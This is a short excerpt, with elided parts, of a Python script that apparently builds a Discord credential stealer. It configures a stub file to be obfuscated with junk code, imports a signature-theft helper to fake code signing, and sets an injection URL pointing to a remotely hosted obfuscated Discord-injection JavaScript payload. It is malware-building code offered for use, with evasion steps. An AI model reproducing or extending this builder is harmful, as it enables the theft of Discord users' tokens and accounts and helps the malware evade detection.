...
disable_warnings()
import MNTOBF as obfuscator
from sigthief import outputCert

SettingsFile = "config.json"
InCodeFile = "stub.py"
OutCodeFile = "stub-o.py"
InjectionURL = "https://raw.githubusercontent.com/MNT-W/Discord-Injection-BG/main/injection-obfuscated.js"
...
def main() -> None:
    ...
    obfuscator.MNTOBF(code, OutCodeFile)
    junk(OutCodeFile)
